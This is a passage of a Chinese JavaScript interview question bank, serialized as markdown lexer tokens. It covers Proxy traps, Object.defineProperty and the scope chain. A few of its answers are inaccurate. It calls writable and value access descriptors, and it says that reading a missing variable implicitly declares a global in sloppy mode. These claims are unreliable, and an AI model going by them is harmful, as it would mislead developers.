类型：基础\\n\\n","depth":4,"text":"类型：基础","tokens":[{"type":"text","raw":"类型：基础","text":"类型：基础","escaped":false}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（6 分）\\n\\n","depth":4,"text":"解答（6 分）","tokens":[{"type":"text","raw":"解答（6 分）","text":"解答（6 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **4：** 部分 API","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **4：** 部分 API","task":false,"loose":false,"text":"**4：** 部分 API","tokens":[{"type":"text","raw":"**4：** 部分 API","text":"**4：** 部分 API","tokens":[{"type":"strong","raw":"**4：**","text":"4：","tokens":[{"type":"text","raw":"4：","text":"4：","escaped":false}]},{"type":"text","raw":" 部分 API","text":" 部分 API","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"![](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3e08a8f141f44148ad6f66c7fdc1ab3e~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp)","text":"![](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3e08a8f141f44148ad6f66c7fdc1ab3e~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp)","tokens":[{"type":"image","raw":"![](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3e08a8f141f44148ad6f66c7fdc1ab3e~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp)","href":"https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3e08a8f141f44148ad6f66c7fdc1ab3e~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp","title":null,"text":""}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 函数调用的监听","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 函数调用的监听","task":false,"loose":false,"text":"**1：** 函数调用的监听","tokens":[{"type":"text","raw":"**1：** 函数调用的监听","text":"**1：** 函数调用的监听","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 函数调用的监听","text":" 函数调用的监听","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nfunction fun() {\\n    console.log(\\"哈哈哈\\");\\n}\\n\\nconst objProxy = new Proxy(fun, {\\n    /**\\n     * 拦截对函数的调用的捕获器\\n     * @param target target new Proxy 所代理的 obj（监听的对象）\\n     * @param thisArg 调用函数时绑定的 this 值\\n     * @param argArray 调用函数时传递的参数列表\\n     */\\n    apply(target, thisArg, argArray) {\\n        console.log(\\"对 fun 函数进行了 apply 的调用。\\");\\n        // 调用原始函数，并在其结果前后添加一些内容\\n        target.apply(thisArg, argArray)\\n    },\\n    /**\\n     * 监听 class 时的捕获器\\n     * @param target target new Proxy 所代理的 obj（监听的对象）\\n     * @param argArray new fun() 时传入的参数，例：new fun(1, 2, ...rest)\\n     * @param newTarget 被调用的构造函数。在这里，newTarget 就是 objProxy 本身，因为 objProxy 是一个函数代理\\n     */\\n    construct(target, argArray, newTarget) {\\n        console.log(\\"对 fun 函数进行了 construct 的调用。\\");\\n        return new target(...argArray)\\n    }\\n});\\n\\nobjProxy.apply();\\nnew objProxy();\\n\\n```","lang":"js","text":"function fun() {\\n    console.log(\\"哈哈哈\\");\\n}\\n\\nconst objProxy = new Proxy(fun, {\\n    /**\\n     * 拦截对函数的调用的捕获器\\n     * @param target target new Proxy 所代理的 obj（监听的对象）\\n     * @param thisArg 调用函数时绑定的 this 值\\n     * @param argArray 调用函数时传递的参数列表\\n     */\\n    apply(target, thisArg, argArray) {\\n        console.log(\\"对 fun 函数进行了 apply 的调用。\\");\\n        // 调用原始函数，并在其结果前后添加一些内容\\n        target.apply(thisArg, argArray)\\n    },\\n    /**\\n     * 监听 class 时的捕获器\\n     * @param target target new Proxy 所代理的 obj（监听的对象）\\n     * @param argArray new fun() 时传入的参数，例：new fun(1, 2, ...rest)\\n     * @param newTarget 被调用的构造函数。在这里，newTarget 就是 objProxy 本身，因为 objProxy 是一个函数代理\\n     */\\n    construct(target, argArray, newTarget) {\\n        console.log(\\"对 fun 函数进行了 construct 的调用。\\");\\n        return new target(...argArray)\\n    }\\n});\\n\\nobjProxy.apply();\\nnew objProxy();\\n"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** new Proxy 中 receiver 参数的作用","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** new Proxy 中 receiver 参数的作用","task":false,"loose":false,"text":"**1：** new Proxy 中 receiver 参数的作用","tokens":[{"type":"text","raw":"**1：** new Proxy 中 receiver 参数的作用","text":"**1：** new Proxy 中 receiver 参数的作用","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" new Proxy 中 receiver 参数的作用","text":" new Proxy 中 receiver 参数的作用","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nconst obj = {\\n    _name: \\"里斯\\",\\n    age: 16,\\n    get name() {\\n        return this._name;\\n    },\\n    set name(newValue) {\\n        this._name = newValue;\\n    }\\n};\\n\\nconst objProxy = new Proxy(obj, {\\n    /**\\n     * receiver 就是 objProxy 这个代理对象\\n     * receiver 传入 Reflect.get 之后，他就作为 obj 里的 this 了（this 这个时候就改变了）\\n     *\\n     */\\n    get(target, key, receiver) {\\n        console.log(receiver);\\n        /**\\n         * 传入 receiver 后，他被访问了两次\\n         */\\n        return Reflect.get(target, key, receiver);\\n    },\\n    set(target, key, newValue, receiver) {\\n        Reflect.set(target, key, newValue, receiver);\\n    }\\n});\\n\\nobjProxy.name = \\"哈哈哈\\";\\nconsole.log(objProxy.name);\\n```","lang":"js","text":"const obj = {\\n    _name: \\"里斯\\",\\n    age: 16,\\n    get name() {\\n        return this._name;\\n    },\\n    set name(newValue) {\\n        this._name = newValue;\\n    }\\n};\\n\\nconst objProxy = new Proxy(obj, {\\n    /**\\n     * receiver 就是 objProxy 这个代理对象\\n     * receiver 传入 Reflect.get 之后，他就作为 obj 里的 this 了（this 这个时候就改变了）\\n     *\\n     */\\n    get(target, key, receiver) {\\n        console.log(receiver);\\n        /**\\n         * 传入 receiver 后，他被访问了两次\\n         */\\n        return Reflect.get(target, key, receiver);\\n    },\\n    set(target, key, newValue, receiver) {\\n        Reflect.set(target, key, newValue, receiver);\\n    }\\n});\\n\\nobjProxy.name = \\"哈哈哈\\";\\nconsole.log(objProxy.name);"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 17. Object.defineProperty 的使用\\n\\n","depth":2,"text":"17. Object.defineProperty 的使用","tokens":[{"type":"text","raw":"17. Object.defineProperty 的使用","text":"17. Object.defineProperty 的使用","escaped":false}]},{"type":"heading","raw":"#### 类型：基础\\n\\n","depth":4,"text":"类型：基础","tokens":[{"type":"text","raw":"类型：基础","text":"类型：基础","escaped":false}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：** Object.defineProperty 的设计初中不是为了监听对象中属性变化的，而是为了定义访问属性描述符。\\n\\n- **1：** 访问属性描述符包括：configurable、enumerable、writable、value\\n\\n- **1：** 访问属性描述符的方法：Object.getOwnPropertyDescriptor()\\n\\n- **1：** 缺点\\n\\n    ① 一次监听太多的时候，不是很友好\\n\\n    ② 新增、删除的时候，他是无能为力的\\n\\n    ③ 会修改原对象中的属性","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** Object.defineProperty 的设计初中不是为了监听对象中属性变化的，而是为了定义访问属性描述符。\\n\\n","task":false,"loose":true,"text":"**1：** Object.defineProperty 的设计初中不是为了监听对象中属性变化的，而是为了定义访问属性描述符。\\n","tokens":[{"type":"text","raw":"**1：** Object.defineProperty 的设计初中不是为了监听对象中属性变化的，而是为了定义访问属性描述符。\\n","text":"**1：** Object.defineProperty 的设计初中不是为了监听对象中属性变化的，而是为了定义访问属性描述符。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Object.defineProperty 的设计初中不是为了监听对象中属性变化的，而是为了定义访问属性描述符。","text":" Object.defineProperty 的设计初中不是为了监听对象中属性变化的，而是为了定义访问属性描述符。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 访问属性描述符包括：configurable、enumerable、writable、value\\n\\n","task":false,"loose":true,"text":"**1：** 访问属性描述符包括：configurable、enumerable、writable、value\\n","tokens":[{"type":"text","raw":"**1：** 访问属性描述符包括：configurable、enumerable、writable、value\\n","text":"**1：** 访问属性描述符包括：configurable、enumerable、writable、value","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 访问属性描述符包括：configurable、enumerable、writable、value","text":" 访问属性描述符包括：configurable、enumerable、writable、value","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 访问属性描述符的方法：Object.getOwnPropertyDescriptor()\\n\\n","task":false,"loose":true,"text":"**1：** 访问属性描述符的方法：Object.getOwnPropertyDescriptor()\\n","tokens":[{"type":"text","raw":"**1：** 访问属性描述符的方法：Object.getOwnPropertyDescriptor()\\n","text":"**1：** 访问属性描述符的方法：Object.getOwnPropertyDescriptor()","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 访问属性描述符的方法：Object.getOwnPropertyDescriptor()","text":" 访问属性描述符的方法：Object.getOwnPropertyDescriptor()","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 缺点\\n\\n    ① 一次监听太多的时候，不是很友好\\n\\n    ② 新增、删除的时候，他是无能为力的\\n\\n    ③ 会修改原对象中的属性","task":false,"loose":true,"text":"**1：** 缺点\\n\\n  ① 一次监听太多的时候，不是很友好\\n\\n  ② 新增、删除的时候，他是无能为力的\\n\\n  ③ 会修改原对象中的属性","tokens":[{"type":"text","raw":"**1：** 缺点","text":"**1：** 缺点","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 缺点","text":" 缺点","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"  ① 一次监听太多的时候，不是很友好","text":"  ① 一次监听太多的时候，不是很友好","tokens":[{"type":"text","raw":"  ① 一次监听太多的时候，不是很友好","text":"  ① 一次监听太多的时候，不是很友好","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"  ② 新增、删除的时候，他是无能为力的","text":"  ② 新增、删除的时候，他是无能为力的","tokens":[{"type":"text","raw":"  ② 新增、删除的时候，他是无能为力的","text":"  ② 新增、删除的时候，他是无能为力的","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"  ③ 会修改原对象中的属性","text":"  ③ 会修改原对象中的属性","tokens":[{"type":"text","raw":"  ③ 会修改原对象中的属性","text":"  ③ 会修改原对象中的属性","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nconst obj = {\\n    name: \\"里斯\\",\\n    age: 16\\n};\\n\\n/**\\n * 监听某个属性\\n */\\n/*\\nObject.defineProperty(obj, \\"name\\", {\\n    set(v) {\\n        console.log(v);\\n        console.log(\\"监听到 set\\");\\n    },\\n    get() {\\n        console.log(\\"监听到 get\\");\\n    }\\n});\\n*/\\n\\n/**\\n * 监听所有的属性\\n */\\nObject.keys(obj).forEach(key => {\\n    console.log(key);\\n    let value = obj[key];\\n    Object.defineProperty(obj, key, {\\n        set(v) {\\n            console.log(`监听到属性 ${key}，被 set 为 ${v}`);\\n            value = v;\\n        },\\n        get() {\\n            console.log(`监听到属性 ${key} get`);\\n            return value;\\n        }\\n    });\\n});\\n\\n\\nobj.name = \\"哈哈哈\\";\\n\\nconsole.log(obj.name);\\n```","lang":"js","text":"const obj = {\\n    name: \\"里斯\\",\\n    age: 16\\n};\\n\\n/**\\n * 监听某个属性\\n */\\n/*\\nObject.defineProperty(obj, \\"name\\", {\\n    set(v) {\\n        console.log(v);\\n        console.log(\\"监听到 set\\");\\n    },\\n    get() {\\n        console.log(\\"监听到 get\\");\\n    }\\n});\\n*/\\n\\n/**\\n * 监听所有的属性\\n */\\nObject.keys(obj).forEach(key => {\\n    console.log(key);\\n    let value = obj[key];\\n    Object.defineProperty(obj, key, {\\n        set(v) {\\n            console.log(`监听到属性 ${key}，被 set 为 ${v}`);\\n            value = v;\\n        },\\n        get() {\\n            console.log(`监听到属性 ${key} get`);\\n            return value;\\n        }\\n    });\\n});\\n\\n\\nobj.name = \\"哈哈哈\\";\\n\\nconsole.log(obj.name);"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 18. 作用域链的理解\\n\\n","depth":2,"text":"18. 作用域链的理解","tokens":[{"type":"text","raw":"18. 作用域链的理解","text":"18. 作用域链的理解","escaped":false}]},{"type":"heading","raw":"#### 类型：基础\\n\\n","depth":4,"text":"类型：基础","tokens":[{"type":"text","raw":"类型：基础","text":"类型：基础","escaped":false}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"paragraph","raw":"注：作用域链是指在 JavaScript 中，当访问一个变量时，JavaScript 引擎会按照一定的顺序在当前作用域以及其上层作用域中查找该变量。这个查找的过程就形成了作用域链。","text":"注：作用域链是指在 JavaScript 中，当访问一个变量时，JavaScript 引擎会按照一定的顺序在当前作用域以及其上层作用域中查找该变量。这个查找的过程就形成了作用域链。","tokens":[{"type":"text","raw":"注：作用域链是指在 JavaScript 中，当访问一个变量时，JavaScript 引擎会按照一定的顺序在当前作用域以及其上层作用域中查找该变量。这个查找的过程就形成了作用域链。","text":"注：作用域链是指在 JavaScript 中，当访问一个变量时，JavaScript 引擎会按照一定的顺序在当前作用域以及其上层作用域中查找该变量。这个查找的过程就形成了作用域链。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：** 数据类型","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 数据类型","task":false,"loose":false,"text":"**1：** 数据类型","tokens":[{"type":"text","raw":"**1：** 数据类型","text":"**1：** 数据类型","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 数据类型","text":" 数据类型","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```mermaid\\ngraph TD;\\n\\n    A[作用域链] --> B[作用域];\\n    A --> C[词法作用域];\\n    A --> D[作用域链];\\n```","lang":"mermaid","text":"graph TD;\\n\\n    A[作用域链] --> B[作用域];\\n    A --> C[词法作用域];\\n    A --> D[作用域链];"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 作用域","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 作用域","task":false,"loose":false,"text":"**1：** 作用域","tokens":[{"type":"text","raw":"**1：** 作用域","text":"**1：** 作用域","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 作用域","text":" 作用域","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"作用域即变量（变量作用域又称上下文）和函数生效（能被访问）的区域或集合。它决定了代码区块中变量和其他资源的可见性。\\n例如：","text":"作用域即变量（变量作用域又称上下文）和函数生效（能被访问）的区域或集合。它决定了代码区块中变量和其他资源的可见性。\\n例如：","tokens":[{"type":"text","raw":"作用域即变量（变量作用域又称上下文）和函数生效（能被访问）的区域或集合。它决定了代码区块中变量和其他资源的可见性。\\n例如：","text":"作用域即变量（变量作用域又称上下文）和函数生效（能被访问）的区域或集合。它决定了代码区块中变量和其他资源的可见性。\\n例如：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n\\nfunction greet() {\\n  var greeting = \'Hello World!\';\\n  console.log(greeting);\\n}\\ngreet();\\n\\nconsole.log(greeting);// Uncaught ReferenceError: greeting is not defined\\n\\n```","lang":"js","text":"\\nfunction greet() {\\n  var greeting = \'Hello World!\';\\n  console.log(greeting);\\n}\\ngreet();\\n\\nconsole.log(greeting);// Uncaught ReferenceError: greeting is not defined\\n"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 全局作用域","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 全局作用域","task":false,"loose":false,"text":"**1：** 全局作用域","tokens":[{"type":"text","raw":"**1：** 全局作用域","text":"**1：** 全局作用域","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 全局作用域","text":" 全局作用域","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"任何不在函数中或是大括号中声明的变量，都是在全局作用域下。全局作用域下声明的变量可以在程序的任意位置访问。","text":"任何不在函数中或是大括号中声明的变量，都是在全局作用域下。全局作用域下声明的变量可以在程序的任意位置访问。","tokens":[{"type":"text","raw":"任何不在函数中或是大括号中声明的变量，都是在全局作用域下。全局作用域下声明的变量可以在程序的任意位置访问。","text":"任何不在函数中或是大括号中声明的变量，都是在全局作用域下。全局作用域下声明的变量可以在程序的任意位置访问。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n// 全局变量\\nvar greeting = \'Hello World!\';\\nfunction greet() {\\n  console.log(greeting);\\n}\\n// 打印 \'Hello World!\'\\ngreet();\\n```","lang":"js","text":"// 全局变量\\nvar greeting = \'Hello World!\';\\nfunction greet() {\\n  console.log(greeting);\\n}\\n// 打印 \'Hello World!\'\\ngreet();"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 函数作用域","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 函数作用域","task":false,"loose":false,"text":"**1：** 函数作用域","tokens":[{"type":"text","raw":"**1：** 函数作用域","text":"**1：** 函数作用域","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 函数作用域","text":" 函数作用域","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nfunction greet() {\\n  var greeting = \'Hello World!\';\\n  console.log(greeting);\\n}\\n// 打印 \'Hello World!\'\\ngreet();\\n// 报错: Uncaught ReferenceError: greeting is not defined\\nconsole.log(greeting);\\n\\n```","lang":"js","text":"function greet() {\\n  var greeting = \'Hello World!\';\\n  console.log(greeting);\\n}\\n// 打印 \'Hello World!\'\\ngreet();\\n// 报错: Uncaught ReferenceError: greeting is not defined\\nconsole.log(greeting);\\n"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 块级作用域","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 块级作用域","task":false,"loose":false,"text":"**1：** 块级作用域","tokens":[{"type":"text","raw":"**1：** 块级作用域","text":"**1：** 块级作用域","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 块级作用域","text":" 块级作用域","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"ES6 引入：ES6 引入了let和const关键字，与var关键字不同，在大括号中使用let和const声明的变量存在于块级作用域中。在大括号之外不能访问这些变量。","text":"ES6 引入：ES6 引入了let和const关键字，与var关键字不同，在大括号中使用let和const声明的变量存在于块级作用域中。在大括号之外不能访问这些变量。","tokens":[{"type":"text","raw":"ES6 引入：ES6 引入了let和const关键字，与var关键字不同，在大括号中使用let和const声明的变量存在于块级作用域中。在大括号之外不能访问这些变量。","text":"ES6 引入：ES6 引入了let和const关键字，与var关键字不同，在大括号中使用let和const声明的变量存在于块级作用域中。在大括号之外不能访问这些变量。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n{\\n  // 块级作用域中的变量\\n  let greeting = \'Hello World!\';\\n  var lang = \'English\';\\n  console.log(greeting); // Prints \'Hello World!\'\\n}\\n// 变量 \'English\'\\nconsole.log(lang);\\n// 报错: Uncaught ReferenceError: greeting is not defined\\nconsole.log(greeting);\\n```","lang":"js","text":"{\\n  // 块级作用域中的变量\\n  let greeting = \'Hello World!\';\\n  var lang = \'English\';\\n  console.log(greeting); // Prints \'Hello World!\'\\n}\\n// 变量 \'English\'\\nconsole.log(lang);\\n// 报错: Uncaught ReferenceError: greeting is not defined\\nconsole.log(greeting);"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 词法作用域","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 词法作用域","task":false,"loose":false,"text":"**1：** 词法作用域","tokens":[{"type":"text","raw":"**1：** 词法作用域","text":"**1：** 词法作用域","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 词法作用域","text":" 词法作用域","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"词法作用域又叫静态作用域，变量在创建时就确定好了其作用域，而非在执行阶段确定。也就是说，在编写代码时作用域就已经确定了，JavaScript 遵循的就是词法作用域","text":"词法作用域又叫静态作用域，变量在创建时就确定好了其作用域，而非在执行阶段确定。也就是说，在编写代码时作用域就已经确定了，JavaScript 遵循的就是词法作用域","tokens":[{"type":"text","raw":"词法作用域又叫静态作用域，变量在创建时就确定好了其作用域，而非在执行阶段确定。也就是说，在编写代码时作用域就已经确定了，JavaScript 遵循的就是词法作用域","text":"词法作用域又叫静态作用域，变量在创建时就确定好了其作用域，而非在执行阶段确定。也就是说，在编写代码时作用域就已经确定了，JavaScript 遵循的就是词法作用域","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n\\nvar a = 2;\\nfunction foo() {\\n  console.log(a);\\n}\\nfunction bar() {\\n  var a = 3;\\n  foo();\\n}\\nbar();\\n```","lang":"js","text":"\\nvar a = 2;\\nfunction foo() {\\n  console.log(a);\\n}\\nfunction bar() {\\n  var a = 3;\\n  foo();\\n}\\nbar();"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 作用域链","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 作用域链","task":false,"loose":false,"text":"**1：** 作用域链","tokens":[{"type":"text","raw":"**1：** 作用域链","text":"**1：** 作用域链","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 作用域链","text":" 作用域链","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"在 JavaScript 中使用一个变量时，JavaScript 引擎会尝试在当前作用域下去寻找该变量。如果没找到，再到它的上层作用域寻找，以此类推直到找到该变量或是已经到了全局作用域。","text":"在 JavaScript 中使用一个变量时，JavaScript 引擎会尝试在当前作用域下去寻找该变量。如果没找到，再到它的上层作用域寻找，以此类推直到找到该变量或是已经到了全局作用域。","tokens":[{"type":"text","raw":"在 JavaScript 中使用一个变量时，JavaScript 引擎会尝试在当前作用域下去寻找该变量。如果没找到，再到它的上层作用域寻找，以此类推直到找到该变量或是已经到了全局作用域。","text":"在 JavaScript 中使用一个变量时，JavaScript 引擎会尝试在当前作用域下去寻找该变量。如果没找到，再到它的上层作用域寻找，以此类推直到找到该变量或是已经到了全局作用域。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"如果在全局作用域里仍然找不到该变量，它就会在全局范围内隐式声明该变量（非严格模式下）或是直接报错。","text":"如果在全局作用域里仍然找不到该变量，它就会在全局范围内隐式声明该变量（非严格模式下）或是直接报错。","tokens":[{"type":"text","raw":"如果在全局作用域里仍然找不到该变量，它就会在全局范围内隐式声明该变量（非严格模式下）或是直接报错。","text":"如果在全局作用域里仍然找不到该变量，它就会在全局范围内隐式声明该变量（非严格模式下）或是直接报错。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n\\nvar sex = \'男\';\\nfunction person() {\\n    var name = \'张三\';\\n    function student() {\\n        var age = 18;\\n        console.log(name); // 张三\\n        console.log(sex); // 男\\n    }\\n    student();\\n    console.log(age); // Uncaught ReferenceError: age is not defined\\n}\\nperson();\\n\\n/*\\nstudent 函数内部：\\n当查找name时，在student函数内部找不到，向上一层作用域（person函数内部）找，找到了输出 “张三”。\\n当查找sex时，在student函数内部找不到，向上一层作用域（person函数内部）找，还找不到继续向上一层找，即全局作用域，找到了输出 “男”。\\n\\nperson 函数内部：\\n当查找age时，在person函数内部找不到，向上一层找，即全局作用域，还是找不到则报错。\\n\\n*/\\n```","lang":"js","text":"\\nvar sex = \'男\';\\nfunction person() {\\n    var name = \'张三\';\\n    function student() {\\n        var age = 18;\\n        console.log(name); // 张三\\n        console.log(sex); // 男\\n    }\\n    student();\\n    console.log(age); // Uncaught ReferenceError: age is not defined\\n}\\nperson();\\n\\n/*\\nstudent 函数内部：\\n当查找name时，在student函数内部找不到，向上一层作用域（person函数内部）找，找到了输出 “张三”。\\n当查找sex时，在student函数内部找不到，向上一层作用域（person函数内部）找，还找不到继续向上一层找，即全局作用域，找到了输出 “男”。\\n\\nperson 函数内部：\\n当查找age时，在person函数内部找不到，向上一层找，即全局作用域，还是找不到则报错。\\n\\n*/"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 19. 柯里化\\n\\n","depth":2,"text":"19. 柯里化","tokens":[{"type":"text","raw":"19. 柯里化","text":"19. 柯里化","escaped":false}]},{"type":"heading","raw":"#### 类型：基础\\n\\n","depth":4,"text":"类型：基础","tokens":[{"type":"text","raw":"类型：基础","text":"类型：基础","escaped":false}]},{"type":"heading","raw":"#### 